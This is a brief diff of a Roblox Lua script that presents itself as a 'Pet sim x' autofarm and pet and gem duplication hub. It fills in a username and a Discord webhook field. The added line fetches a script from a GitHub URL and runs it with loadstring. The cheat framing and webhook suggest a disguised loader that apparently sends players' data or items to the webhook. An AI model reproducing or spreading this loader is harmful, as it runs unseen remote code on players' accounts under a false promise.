@@ -2,4 +2,4 @@ _G.Username "YT_BabyYodaGaming"
 _G.HubName "[Summer] Pet sim x AUTOFARM, PET DUPER,GEM DUPER"
 _G.WebhookUrl "discord.com/webhooks/"
 
-loadstring(game:HttpGet(""))()
+loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
